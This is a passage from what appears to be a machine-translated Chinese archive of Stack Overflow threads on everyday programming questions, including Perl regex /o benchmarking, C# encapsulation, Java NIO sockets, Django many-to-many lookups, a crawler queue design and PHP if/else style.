        yandex\.
        .+
    }x;

use constant FINAL_RE => qr,^@{[ RE ]}(/|$),;

my $RE = RE;

use constant ITER_COUNT => 1e5;

use constant URL => 'http://news.trofimenkov.nerpa.yandex.ru/yandsearch?cl4url=www.forbes.ru%2Fnews%2F276745-visa-otklyuchila-rossiiskie-banki-v-krymu&lr=213&lang=ru';

timeit(
    '=~ m/literal-wo-vars/',
    ITER_COUNT,
    sub {
        for (my $i = 0; $i < ITER_COUNT; ++$i) {
            URL =~ m{
                ^https?://
                (?:[^.]+-d-[^.]+\.)?
                (?:(?: (?:dev-)? nind[^.]* | mr02 )\.)?
                (?:(?:pda|m)\.)?
                (?:(?:news|haber)\.)
                (?:.+\.)?
                yandex\.
                .+
                (/|$)
            }x
        }
    }
);

timeit(
    '=~ m/$VAR/',
    ITER_COUNT,
    sub {
        for (my $i = 0; $i < ITER_COUNT; ++$i) {
            URL =~ m,^$RE(/|$),
        }
    }
);

timeit(
    '=~ $VAR',
    ITER_COUNT,
    sub {
        my $r = qr,^$RE(/|$),o;
        for (my $i = 0; $i < ITER_COUNT; ++$i) {
            URL =~ $r
        }
    }
);

timeit(
    '=~ m/$VAR/o',
    ITER_COUNT,
    sub {
        for (my $i = 0; $i < ITER_COUNT; ++$i) {
            URL =~ m,^$RE(/|$),o
        }
    }
);

timeit(
    '=~ m,@{[ CONST ]},',
    ITER_COUNT,
    sub {
        for (my $i = 0; $i < ITER_COUNT; ++$i) {
            URL =~ m,^@{[ RE ]}(/|$),
        }
    }
);

timeit(
    '=~ m,@{[ CONST ]},o',
    ITER_COUNT,
    sub {
        for (my $i = 0; $i < ITER_COUNT; ++$i) {
            URL =~ m,^@{[ RE ]}(/|$),o
        }
    }
);

timeit(
    '=~ CONST',
    ITER_COUNT,
    sub {
        my $r = qr,^$RE(/|$),o;
        for (my $i = 0; $i < ITER_COUNT; ++$i) {
            URL =~ FINAL_RE
        }
    }
);

sub timeit {
    my ($name, $iters, $code) = @_;
    #my $t0 = [gettimeofday];
    my $t0 = (getrusage RUSAGE_SELF)[0];
    $code->();
    #my $el = tv_interval($t0);
    my $el = (getrusage RUSAGE_SELF)[0] - $t0;
    printf "%.3f\t%-17s\t%.9f\n", $el, $name, $el / $iters
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-03-23T19:54:49.253

*不可思议的是，它没有*做的一件事是，至少在 5.8.8 中允许 ONCE 块。

`perl -le 'for (1..3){ print; m/${\(print( "between 1 and 2 only"), 3)}/o and print "matched" }'`

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-07-22T18:13:51.973

**是的，不是的**

我使用以下脚本进行了简单的比较：

```
perl -MBenchmark=cmpthese -E 'my @n = 1..10000; cmpthese(10000, {string => sub{"a1b" =~ /a\d+c/ for @n}, o_flag => sub{"a1b" =~ /a\d+c/o for @n}, qr => sub{my $qr = qr/a\d+c/; "a1b" =~ /$qr/ for @n } })' 
```

结果如下：

```
 Rate     qr string o_flag
qr      760/s     --   -72%   -73%
string 2703/s   256%     --    -5%
o_flag 2833/s   273%     5%     -- 
```

因此，显然**/o 标志****比**使用 qr快得多。

但显然**/o 标志**可能会导致**错误**： [Perl regex /o optimization or bug?](https://stackoverflow.com/questions/68454089/perl-regex-o-optimization-or-bug/68454090#68454090)

# c# - 使方法/属性对一个类可见，对其他类隐藏

> ID：550268
> 
> 赞同：6
> 
> 时间：2009-02-15T03:39:33.107
> 
> 标签：c#, encapsulation

我有一堂课`Server`，它与 IRC 的服务器连接对话。它拥有一个已知`User`s 的列表，并根据需要创建它们。

我有两个涉及`User`课程的问题：

1.  任何人都可以创建`User`. 我只希望`Server`班级能够做到这一点。
2.  如果用户（事物`User`描述）更改了他/她的姓名（或其他信息，如加入的频道），则`Server`该类可以自行更改。但是，其他类也可以！我想禁止其他类接触此信息（使其只读）。

我该如何解决这两个问题？在 C++ 中，它可以通过使用`friend`关键字并使 ctor 和`setName`（等）私有来解决。

是否有一个 C# 关键字可以允许指定类访问某个方法？这将解决我的问题。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-15T03:54:37.657

老实说，我发现`friend`源自 C++ 的访问是糟糕设计的症状。你最好修复你的设计。

首先，谁真正关心是否有人创建了用户？真的有关系吗？我问这个是因为有时我们的程序员似乎会担心那些根本不会发生的事情，或者如果他们发生了，那也没关系。

如果您真的很在意，请执行以下操作之一：

*   让用户成为一个界面。服务器可以实例化一个实现它的私有类；或者
*   使 User 成为 Server 的内部类，没有公共构造函数，因此只有 Server 可以实例化它。

可见性 hack（C++ 中的朋友是其中之一，Java 中的包访问都是很好的例子）只是自找麻烦而不是一个好主意。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-15T03:42:48.450

.NET 世界中最接近的`friend`是`internal`可见性。

请注意，如果您的两个类位于不同的程序集中，则可以使用[InternalsVisibleTo](http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.internalsvisibletoattribute.aspx)属性来允许一个程序集对另一个程序集的内部进行可见性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T03:53:24.387

重新设计你的类层次结构可能是解决这个问题的一个公平的解决方案。因为在我看来，当它存在于 Server 类之外时，您真正需要的是一个只读的 User 类。

我可能会做这样的事情：

```
// An abstract base class. This is what I'd use outside the 
// Server class. It's abstract, so it can't be instantiated
// on its own, and it only has getters for the properties. 
public abstract class User
{
   protected User()
   {
   }

   public string Name { get;}
   // Other get-only properties
}

public class ServerUser : User
{
   public ServerUser()
   {
   }

   public string Name { get; set;}
   // Other properties. 
} 
```

然后让 Server 类创建 ServerUser 类，使用 Server 类来更改 ServerUser 类的属性（如更改用户名），但只将 User 类暴露给外界。

# java - 如何使用 serversocketchannel 从端口获取最大字节数

> ID：550271
> 
> 赞同：0
> 
> 时间：2009-02-15T03:41:12.153
> 
> 标签：java, sockets, nio

我正在使用`nio`包开发一个多端口读取应用程序。实际上这些端口连续接收数据包。使用`nio`包我们必须使用通道读取数据包。不应该有丢包。请提出一种可行的方法来处理缓冲区，以便我可以将整个数据 dmp 到数据库中而不会丢失。

这是我的代码：

我很困惑 `else if ((key.readyOps() & SelectionKey.OP_READ)== SelectionKey.OP_READ)`。

```
import java.io.*;
import java.net.*;
import java.nio.*;
import java.nio.channels.*;
import java.util.*;

public class MultiPortEcho
{
  private int ports[];
  private ByteBuffer echoBuffer = ByteBuffer.allocate(32000);

  public MultiPortEcho( int ports[] ) throws IOException
  {
    this.ports = ports;
    go();
  }

  private void go() throws IOException
  {
    // Create a new selector
    Selector selector = Selector.open();

    // Open a listener on each port, and register each one
    // with the selector
    for (int i=0; i<ports.length; ++i)
    {
      ServerSocketChannel ssc = ServerSocketChannel.open();
      ssc.configureBlocking( false );
      ServerSocket ss = ssc.socket();
      InetSocketAddress address = new InetSocketAddress( ports[i] );
      ss.bind( address );

      SelectionKey key = ssc.register( selector, SelectionKey.OP_ACCEPT );

      System.out.println( "Going to listen on "+ports[i] );
    }

    while (true)
    {
      int num = selector.select();
      System.out.println("num::::"+num);
      Set selectedKeys = selector.selectedKeys();
      Iterator it = selectedKeys.iterator();

      while (it.hasNext())
      {
        SelectionKey key = (SelectionKey)it.next();

        if ((key.readyOps() & SelectionKey.OP_ACCEPT)== SelectionKey.OP_ACCEPT)
          {
              // Accept the new connection
              ServerSocketChannel ssc = (ServerSocketChannel)key.channel();
              SocketChannel sc = ssc.accept();
              sc.configureBlocking( false );

              // Add the new connection to the selector
              SelectionKey newKey = sc.register(selector,SelectionKey.OP_READ);
              it.remove();

              System.out.println( "Got connection from "+sc );
        }
          else if ((key.readyOps() & SelectionKey.OP_READ)== SelectionKey.OP_READ)
          {
              // Read the data
              SocketChannel sc =(SocketChannel)key.channel();
              System.out.println("sc::::"+sc);
              // data to fetched from channel and dump into the datatbase
              int bytesEchoed = 0;
              //while(true)
              {
                    echoBuffer.clear();
                    int r = sc.read(echoBuffer);
                    System.out.println("r:::" + r);
                    /*int pos=echoBuffer.position();
                    System.out.println("pos:::" +pos);*/
                    if (r == -1)
                    {
                        //echoBuffer.flip();
                        echoBuffer.rewind();
                        byte[] array = new byte[100000];
                        while (echoBuffer.hasRemaining())
                        {
                            int n = echoBuffer.remaining();
                            System.out.println("size:" + n);
                            echoBuffer.get(array,0,n );
                            System.out.println(new String(array,0,n));
                            key.cancel();
                            it.remove();

                        }

                    }

                    /*int pos=echoBuffer.position();
                    System.out.println("pos:::" + pos);
                    if(r<=0)
                    {
                        echoBuffer.flip();
                        for (int j = 0; j < pos; j++ )
                        {
                            String ss =Integer.toHexString(echoBuffer.get());
                            if (ss.length() == 1)
                                System.out.print("0" + ss + " ");
                            else if (ss.length() > 2)
                                System.out.print(ss.substring(6) + " ");
                            else System.out.print(ss + " ");
                        }
                      break;
                    }

                    echoBuffer.flip();

                    sc.write( echoBuffer );
                    bytesEchoed += r;*/
              }

             //System.out.println( "Echoed "+bytesEchoed+" from "+sc );
             //it.remove();
        }

      }

//System.out.println( "going to clear" );
//      selectedKeys.clear();
//System.out.println( "cleared" );
    }
  }

  static public void main( String args[] ) throws Exception
  {
    FileOutputStream fileoutputstream = new FileOutputStream("MultiPort.txt", false);
    PrintStream printstream = new PrintStream(fileoutputstream);
    System.setOut(printstream);
    if (args.length<=0) {
      System.err.println( "Usage: java MultiPortEcho port [port port ...]" );
      System.exit( 1 );
    }

    int ports[] = new int[args.length];

    for (int i=0; i<args.length; ++i) {
      ports[i] = Integer.parseInt( args[i] );
    }

    new MultiPortEcho( ports );
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-03T20:45:04.140

这不是双标吗？我想我在其他地方看到了这个问题。

无论如何，您需要做的第一件事就是删除`key.cancel()`，这会使您的密钥完全无效，这样它就不会出现在以后的选择中。

# c# - 将所有 C# 文件编译成一个文件？

> ID：550276
> 
> 赞同：6
> 
> 时间：2009-02-15T03:45:00.660
> 
> 标签：c#, .net

有没有办法将 C# 文件编译成一个可以提供给用户的文件？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-02-15T03:48:27.813

一种方法是使用[ILMerge](http://research.microsoft.com/en-us/people/mbarnett/ilmerge.aspx)。这会将多个程序集合并为一个（考虑将所有 DLL 和一个主 exe 合并为一个 exe）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T03:50:56.480

是的:) 但是您必须将所有源代码放入一个程序集中并将其编译为 EXE。另请注意，目标系统还必须安装所需的 .NET 基础结构。

请注意，目标系统上的安全策略可能会阻止用户直接运行您的应用程序。

最后，除非你“ [NGEN](http://msdn.microsoft.com/en-us/library/6t9t5wcf(VS.80).aspx) ”你的代码，否则它会在第一次运行时被[jit 。](http://msdn.microsoft.com/en-us/library/z1zx9t92(VS.80).aspx)这将产生一些启动时间成本。在某些情况下，这些可能相当大。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T05:40:54.360

如果您还希望合并您的应用程序所需的 .Net 程序集，您可以使用类似[这样](http://www.xenocode.com/Products/Postbuild-for-NET/)的东西来编译 System.dll、System.Windows.Forms.dll 等，因此最终用户甚至不需要安装 .Net。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-03-30T23:12:30.667

我从一个类似的问题中得到了这个（对不起发布答案的人 - 我似乎无法在此处找到原始链接）：

[如何在 EXE 文件中嵌入应用程序的依赖 DLL](http://blogs.msdn.com/b/microsoft_press/archive/2010/02/03/jeffrey-richter-excerpt-2-from-clr-via-c-third-edition.aspx)

它摘自 Jeffrey Richter 的 CLR 通过 C#。我还没有尝试过，但看起来很有希望。我认为它也可以与 WPF 一起使用（我自己会发现）。

# javascript - JavaScript 滚动问题

> ID：550277
> 
> 赞同：0
> 
> 时间：2009-02-15T03:47:02.653
> 
> 标签：javascript, scroll

我正在尝试将以下 JavaScript Scroller 合并到一个网站中，但是一旦我将它包含在一个具有布局的 HTML 页面中，例如。表格/DIV 似乎已损坏且不会显示。想知道是否有人有任何建议。

```
<script language="javascript">
//ENTER CONTENT TO SCROLL BELOW.
var content='Content to be scrolled';

var boxheight=150;        // BACKGROUND BOX HEIGHT IN PIXELS.
var boxwidth=150;         // BACKGROUND BOX WIDTH IN PIXELS.
var boxcolor="#E9F0F8";   // BACKGROUND BOX COLOR.
var speed=50;             // SPEED OF SCROLL IN MILLISECONDS (1 SECOND=1000 MILLISECONDS)..
var pixelstep=2;          // PIXELS "STEPS" PER REPITITION.
var godown=false;         // TOP TO BOTTOM=TRUE , BOTTOM TO TOP=FALSE

// DO NOT EDIT BEYOND THIS POINT

var outer,inner,elementheight,ref,refX,refY;
var w3c=(document.getElementById)?true:false;
var ns4=(document.layers)?true:false;
var ie4=(document.all && !w3c)?true:false;
var ie5=(document.all && w3c)?true:false;
var ns6=(w3c && navigator.appName.indexOf("Netscape")>=0)?true:false;
var txt='';
if(ns4){
txt+='<table cellpadding=0 cellspacing=0 border=0 height='+boxheight+' width='+boxwidth+'><tr><td>';
txt+='<ilayer name="ref" bgcolor="'+boxcolor+'" width='+boxwidth+' height='+boxheight+'></ilayer>';
txt+='</td></tr></table>'
txt+='<layer name="outer" bgcolor="'+boxcolor+'" visibility="hidden" width='+boxwidth+' height='+boxheight+'>';
txt+='<layer  name="inner"  width='+(boxwidth-4)+' height='+(boxheight-4)+' visibility="hidden" left="2" top="2" >'+content+'</layer>';
txt+='</layer>';
}else{
txt+='<div id="ref" style="position:relative; width:'+boxwidth+'; height:'+boxheight+'; background-color:'+boxcolor+';" ></div>';
txt+='<div id="outer" style="position:absolute; width:'+boxwidth+'; height:'+boxheight+'; visibility:hidden; background-color:'+boxcolor+'; overflow:hidden" >';
txt+='<div id="inner"  style="position:absolute; visibility:visible; left:2px; top:2px; width:'+(boxwidth-4)+'; overflow:hidden; cursor:default;">'+content+'</div>';
txt+='</div>';
}
document.write(txt);

function getElHeight(el){
if(ns4)return (el.document.height)? el.document.height : el.clip.bottom-el.clip.top;
else if(ie4||ie5)return (el.style.height)? el.style.height : el.clientHeight;
else return (el.style.height)? parseInt(el.style.height):parseInt(el.offsetHeight);
}

function getPageLeft(el){
var x;
if(ns4)return el.pageX;
if(ie4||w3c){
x = 0;
while(el.offsetParent!=null){
x+=el.offsetLeft;
el=el.offsetParent;
}
x+=el.offsetLeft;
return x;
}}

function getPageTop(el){
var y;
if(ns4)return el.pageY;
if(ie4||w3c){
y=0;
while(el.offsetParent!=null){
y+=el.offsetTop;
el=el.offsetParent;
}
y+=el.offsetTop;
return y;
}}

function scrollbox(){
if(ns4){
inner.top+=(godown)? pixelstep: -pixelstep;
if(godown){
if(inner.top>boxheight)inner.top=-elementheight;
}else{
if(inner.top<2-elementheight)inner.top=boxheight+2;
}}else{
inner.style.top=parseInt(inner.style.top)+((godown)? pixelstep: -pixelstep)+'px';
if(godown){
if(parseInt(inner.style.top)>boxheight)inner.style.top=-elementheight+'px';
}else{
if(parseInt(inner.style.top)<2-elementheight)inner.style.top=boxheight+2+'px';
}}}

window.onresize=function(){
if(ns4)setTimeout('history.go(0)', 400);
else{
outer.style.left=getPageLeft(ref)+'px';
outer.style.top=getPageTop(ref)+'px';
}}

window.onload=function(){
outer=(ns4)?document.layers['outer']:(ie4)?document.all['outer']:document.getElementById('outer');
inner=(ns4)?outer.document.layers['inner']:(ie4)?document.all['inner']:document.getElementById('inner');
ref=(ns4)?document.layers['ref']:(ie4)?document.all['ref']:document.getElementById('ref');
elementheight=getElHeight(inner);
if(ns4){
outer.moveTo(getPageLeft(ref),getPageTop(ref));
outer.clip.width=boxwidth;
outer.clip.height=boxheight;
inner.top=(godown)? -elementheight : boxheight-2;
inner.clip.width=boxwidth-4;
inner.clip.height=elementheight;
outer.visibility="show";
inner.visibility="show";
}else{
outer.style.left=getPageLeft(ref)+'px';
outer.style.top=getPageTop(ref)+'px';
inner.style.top=((godown)? -elementheight : boxheight)+'px';
inner.style.clip='rect(0px, '+(boxwidth-4)+'px, '+(elementheight)+'px, 0px)';
outer.style.visibility="visible";
}
setInterval('scrollbox()',speed);
}
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T04:04:44.747

我知道我没有回答你的问题，但这至少可以帮助我今晚入睡。:)

我不确定您到底要做什么，但我不会使用该脚本。我猜你是从某个地方复制和粘贴的，但它看起来好像是几年前写的，现在并不真正符合 JavaScript 的许多最佳实践指南。

如果您正在寻找此类效果的脚本和库，我建议您查看：

*   jQuery，[http://jquery.com/](http://jquery.com/)
*   原型，- [http://www.prototypejs.org/](http://www.prototypejs.org/)
*   道场，- [http://www.dojotoolkit.org/](http://www.dojotoolkit.org/)
*   MooTools，- [http://mootools.net/](http://mootools.net/)
*   Mochikit，- [http://mochikit.com/](http://mochikit.com/)

如果你非要逼我一个，我会推荐 jQuery。当然，除了学习 JavaScript，这是使用上述任何库所必需的。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T04:22:04.177

您的脚本很旧（IE4、Netscape 时代...），它使用[非标准标签](http://www.devguru.com/technologies/html/quickref/html_other_tags.html)（ilayer、layer）。

继续[Andy 的推荐](https://stackoverflow.com/questions/550277/javascript-scroller-problem/550304#550304)，有一些 jQuery 替代品可能适合您的需求，例如[jdNewsScroll](http://jdsharp.us/jQuery/plugins/jdNewsScroll/)或这个[ScrollUp Headline Reader](http://www.learningjquery.com/2006/10/scroll-up-headline-reader)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T04:23:50.647

啊啊啊我的眼睛！护目镜什么都不做；）您绝对应该遵循一些人已经提出的一些建议并放弃这个脚本。

如果你必须使用它，这里有一些观察：

1.  忽略整个`ns4`代码部分，上述内容将在当今的浏览器中中断，因为应用于、和元素的`width`和css 规则缺少量词。这些行需要阅读：`height``#ref``#outer``#inner``"px"`

    ```
    txt+='<div id="ref" style="position:relative; width:'+boxwidth+'px; height:'+boxheight+'px; background-color:'+boxcolor+';"></div>';
    txt+='<div id="outer" style="position:absolute; width:'+boxwidth+'px; height:'+boxheight+'px; visibility:hidden; background-color:'+boxcolor+'; overflow:hidden">';
    txt+='<div id="inner" style="position:absolute; visibility:visible; left:2px; top:2px; width:'+(boxwidth-4)+'px; overflow:hidden; cursor:default;">'+content+'</div>'; 
    ```

    注意添加的`"px"`.

2.  我不知道这段代码是否带有说明，但从该`document.write`行的外观来看，您需要将其放置在您的`<body>`, 页面中您希望此滚动内容（或任何内容）出现的位置。

ps 多么糟糕的一堆代码。

# asp.net-mvc - 是否有适用于 ASP.NET（最好是 MVC）的“社交”类型插件？

> ID：550294
> 
> 赞同：0
> 
> 时间：2009-02-15T03:58:24.763
> 
> 标签：asp.net-mvc

Wordpress 有它流行的“ [Sociable](http://yoast.com/wordpress/sociable/) ”插件，它可以让你从所有流行的网站中进行选择，例如 digg、stumbleupon、del.icio.us 等，然后给你一个缩略图列表。

我想知道 ASP.NET 是否有等效的“插件”——最好是可以很容易地制作成 MVC Html 帮助程序扩展方法的东西。

我最好想要一些我可以在新事物出现时更新的东西——并且不想阅读所有这些不同站点的文档来知道要发送哪些参数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T06:03:02.757

asp.net mvc 没有这样的插件或扩展。但我相信您可以轻松创建它:)。而且您不需要“阅读所有这些不同站点的文档以了解要发送哪些参数”，只需查看 wordpress 插件的源代码，您就会在那里找到支持站点的所有必要信息。

# graph - 图形术语的澄清

> ID：550295
> 
> 赞同：4
> 
> 时间：2009-02-15T03:59:30.597
> 
> 标签：graph

我正在做一个家庭作业问题，我已经得到了答案，但我不确定我使用的术语是否正确，我希望有人能澄清一下。情况如下：

我有一个大小为 M x N 的矩形形状的图形。 (0, 0) 处的节点没有传入边。所有其他节点都具有来自北方、西北和西方的传入边，除非它们位于顶部或最左侧，在这种情况下，对角线传入边不存在，并且来自西方或北方的边不存在。

因此，如果从节点 (0, 0) 开始并沿着任何路径到达终点，它将在节点 (m, n) 结束。我现在被要求定义这是什么类型的图表。这是有向无环图吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-15T04:04:06.077

是的，是的，因为每条边都有一个方向（因此是有向的）并且没有循环——一旦你离开任何节点，就没有办法通过沿着图形的边返回它（因此是非循环的）。有关更多信息，请参阅[http://en.wikipedia.org/wiki/Directed_acyclic_graph](http://en.wikipedia.org/wiki/Directed_acyclic_graph)。

# python - Django Model API通过中间表反向查找多对多关系

> ID：550300
> 
> 赞同：4
> 
> 时间：2009-02-15T04:03:13.970
> 
> 标签：python, django, django-models, many-to-many

我有一个居民，但似乎无法获得该居民所属的 SSA 集。我试过`res.ssa_set.all()` `.ssas_set.all()`和`.ssa_resident_set.all()`。好像管不了 通过另一个表进行反向 m2m 查找的语法是什么？

编辑：我收到“QuerySet as no attribute”错误。嗯？

```
class SSA(models.Model):
    name = models.CharField(max_length=100)
    cost_center = models.IntegerField(max_length=4)
    street_num = models.CharField(max_length=9)
    street_name = models.CharField(max_length=40)
    suburb = models.CharField(max_length=40)
    post_code = models.IntegerField(max_length=4, blank=True, null=True)

    def __unicode__(self):
        return self.name

class Resident(models.Model):
    cris_id = models.CharField(max_length=10, primary_key=True)
    first_name = models.CharField(max_length=20)
    last_name = models.CharField(max_length=20)
    ssas = models.ManyToManyField('SSA', through='SSA_Resident', verbose_name="SSAs")

    def __unicode__(self):
        return self._get_full_name()

    def _get_full_name(self):
        return u"%s %s" %(self.first_name, self.last_name)

    full_name = property(_get_full_name)

class SSA_Resident(models.Model):
    id = models.AutoField(primary_key=True)
    resident = models.ForeignKey('Resident')
    ssa = models.ForeignKey('SSA', verbose_name="SSA")
    active = models.BooleanField(default=True)
    def __unicode__(self):
        return u"%s - %s" %(self.resident.full_name, self.ssa.name) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T04:07:41.013

我试图评估一个查询集对象，而不是对象本身。在查询集上执行 get 然后查找关系集工作正常。我正在更改为社区 wiki，并将其留在这里，以防其他人像我一样愚蠢。

一个工作示例：

```
resident = Resident.objects.filter(name='Johnny')
resident.ssa_set.all() # fail
resident = resident.get() # will fail if more than one returned by filter
resident.ssa_set.all() # works, since we're operating on an instance, not a queryset 
```

# cocoa - NSTreeController - malloc 双释放错误

> ID：550305
> 
> 赞同：0
> 
> 时间：2009-02-15T04:04:59.367
> 
> 标签：cocoa, malloc, nstreecontroller

我在我的程序中将 NSTreecontroller 与 NSOutlineView 结合使用，并且我的程序不断吐出：`malloc: *** error for object 0x1d70d0: double free`. 当我删除 IB 中的绑定时，这些消息就会消失。知道为什么会这样吗？

注意：这种行为不会使我的程序崩溃，但我怀疑它可能是崩溃程序的根源。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T06:28:21.127

[NSTreeController 在 Tiger 中有一些破坏行为](http://rentzsch.com/cocoa/foamingAtTheMouth)。我不知道他们是否已经在 Leopard 中修复了它。

正如 Rentzsch 建议的那样，使用 NSZombieEnabled 来捕获第二次免费尝试（假设它是一个 dealloc）。有关说明，请参阅[TN2124](http://developer.apple.com/technotes/tn2004/tn2124.html)。

# .net - 如何在 Visual Studio 中调试这行代码？

> ID：550310
> 
> 赞同：1
> 
> 时间：2009-02-15T04:08:37.593
> 
> 标签：.net, visual-studio-2008, debugging, debug-symbols, symbol-server

我在 VS2008 中有以下代码行。

```
 VirtualPathData virtualPathData = 
        RouteTable.Routes.GetVirtualPath(_viewContext.RequestContext, 
        "Home", 
        pageLinkValueDictionary); 
```

我想调试这个`GetVirtualpath(..)`方法..看看它想做什么。

我假设我需要从 MS 符号服务器中获取符号。

我所做的是

*   关闭*仅启用我的代码*
*   打开*启用源服务器支持*
*   调试时显示*模块*窗口（手动加载正确的模块）

在调试模式下编译，在该行设置断点并调试运行。当我上线时，我`System.Web.Routing(..)`从*MS Symbol server*手动加载。这有效（pdb 在本地下载），当我进入这一行时，我转到了一些 Dissassemler 代码:(

谁能看到我做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-18T07:57:38.063

下载符号文件并不意味着可以使用源，pdb 也需要进行源索引。

来自[Scott Guthrie 的公告](http://weblogs.asp.net/scottgu/archive/2007/10/03/releasing-the-source-code-for-the-net-framework-libraries.aspx)：

> 我们将首先提供 .NET 基类库（System、System.IO、System.Collections、System.Configuration、System.Threading、System.Net、System.Security、 System.Runtime、System.Text 等)、ASP.NET (System.Web)、Windows 窗体 (System.Windows.Forms)、ADO.NET (System.Data)、XML (System.Xml) 和 WPF (System 。视窗）。然后，我们将在未来几个月添加更多库（包括 WCF、Workflow 和 LINQ）。源代码将在 Microsoft 参考许可证 (MS-RL) 下发布。

似乎 System.Web.Routing 不包括在这里。

但是，您可以[下载 MVC Source](http://www.codeplex.com/aspnet)，然后您应该能够针对该源使用下载的 pdb。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-18T19:49:58.940

我看到有人因为这样说而被修改了，但是......

您似乎无法获得正在发生的事情的源代码级别的视图，但如果您真的需要一个关于为什么某些事情可能无法正常工作的答案（并且 StackOverflow 无济于事），请使用[Reflector.NET](http://www.red-gate.com/products/reflector/)从编译的程序集（dll 或 exe）是一个不错的选择。对于任何有经验的 .NET 开发人员来说，该工具都非常易于使用，并且可以对正在发生的事情提供一些非常好的见解。

我们中的许多在 .NET 前沿工作的人都*需要*使用它，因为通常没有其他快速方法，而且对于那些没有 MVP 或 Microsoft 端连接的人来说，它通常是获得“内幕消息”的*唯一方法。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T08:26:39.880

我有点惊讶它为此下载了一个符号文件；上次我查看时，只有框架的一小部分（主要是 2.0）的符号。您目前对此代码有疑问吗？如果是这样，请发布异常/意外行为的详细信息。如果您只是好奇，那么要么 a：阅读[文档](http://msdn.microsoft.com/en-us/library/cc680260.aspx)，要么 b：*也许*有一个带有[反射器](http://reflector.red-gate.com/)的窥探器（警告：“ [IANAL](http://en.wikipedia.org/wiki/IANAL) ”）。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2009-02-15T06:09:49.610

看起来你在谈论 .NET，所以它实际上是你看到的 IL 字节码。我认为 Microsoft 不会发布带有 .NET 源代码的符号，因此 VS 无法帮助您。

使用 .NET Reflector 检查函数的作用。

# data-mining - 每天多次处理网络提要

> ID：550321
> 
> 赞同：-1
> 
> 时间：2009-02-15T04:28:37.733
> 
> 标签：data-mining, web-crawler

好的，这里是简单的交易：我蜘蛛网络（所有类型的数据，博客/新闻/论坛），因为它出现在互联网上。然后我处理这个提要并对处理后的数据进行分析。爬虫没什么大不了的。随着互联网获取新数据，我几乎可以实时获取它。处理是一个瓶颈，它涉及一些计算量大的算法。

我正在寻求制定一个策略来安排我的蜘蛛。最大的目标是确保作为最终结果生成的分析尽可能多地反映最近输入的影响。开始想一想，显而易见的目标是确保数据不会堆积。我通过蜘蛛获取数据，传递给处理代码，等到处理结束，然后蜘蛛更多。这次带来了我在等待处理结束时出现的所有数据。好的，这是一个非常广泛的想法。

你们中的一些人可以分享您的想法，可能会大声思考。如果你是我，你会想到什么。我希望我的问题是有意义的。顺便说一句，这不是搜索引擎索引。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T04:54:37.483

**您似乎**希望使处理器不会落后于蜘蛛太远。我想你也希望能够扩大规模。

我的建议是使用客户端/服务器 SQL 数据库实现队列。MySQL 可以很好地用于此目的。

* * *

**设计目标**

*   防止蜘蛛远远领先于处理器
*   允许蜘蛛和处理器之间的权力平衡（保持每个忙）
*   尽可能保持数据最新
*   根据需要扩展和扩展

* * *

**队列：** 创建一个队列以在处理蜘蛛之前存储来自蜘蛛的数据。这可以通过多种方式完成，但听起来 IO 并不是您的瓶颈。

一个简单的方法是创建一个具有这种布局的 SQL 表：

```
TABLE Queue
    Queue_ID int unsigned not null auto_increment primary key
    CreateDate datetime not null
    Status enum ('New', 'Processing')
    Data blob not null

# pseudo code
function get_from_queue()
    # in SQL
    START TRANSACTION;
    SELECT Queue_ID, Data FROM Queue WHERE Status = 'New' LIMIT 1 FOR UPDATE;
    UPDATE Queue SET Status = 'Processing' WHERE Queue_ID = (from above)
    COMMIT
    # end sql

    return Data# or false in the case of no records found

# pseudo code
function count_from_queue()
    # in SQL
    SELECT COUNT(*) FROM Queue WHERE Status = 'New'
    # end sql
    return (the count) 
```

* * *

**蜘蛛：**

所以你有多个蜘蛛进程..他们每个人都说：

```
if count_from_queue() < 10:
    # do the spider thing
    # save it in the queue
else:
    # sleep awhile

repeat 
```

这样，每只蜘蛛要么在**休息**，要么在**爬**。该决定（在这种情况下）基于待处理的待处理项目是否少于 10 个。您可以根据自己的目的进行调整。

* * *

**处理器**

所以你有多个处理器进程。他们每个人都说：

```
Data = get_from_queue()
if Data:
    # process it
    # remove it from the queue
else:
    # sleep awhile

repeat 
```

这样，每个处理器要么处于**休息**状态，要么处于**处理**状态。

* * *

**总结：** 无论您是在一台计算机上运行，​​还是在 20 台计算机上运行，​​队列都将提供您需要的控制，以确保所有部分同步，并且不会彼此领先太远。

# php - 如何正确格式化 PHP 'IF ELSE' 语句？

> ID：550322
> 
> 赞同：7
> 
> 时间：2009-02-15T04:29:40.087
> 
> 标签：php, code-formatting, readability, if-statement, semantics

这是一个长期存在的问题，我在许多热火朝天的编码会议中遇到过。

一个人以这种方式编码，另一个人以这种方式编码。所以经过多次推拉，我很好奇......有没有正确的方式来表达 PHP 'IF ELSE' 语句？

我个人使用：

```
if ($variable == 'setvalue')
{
    $variable = executefunctiononvariable($variable);
} else {
    $variable = executedifferentfunctiononvariable($variable);
} 
```

尽管我已经提出了其他选择，但经过多次争论，例如：

```
if ($variable == 'setvalue')
{
    $variable = executefunctiononvariable($variable);
}
else
{
    $variable = executedifferentfunctiononvariable($variable);
} 
```

或者

```
if ($variable == 'setvalue')
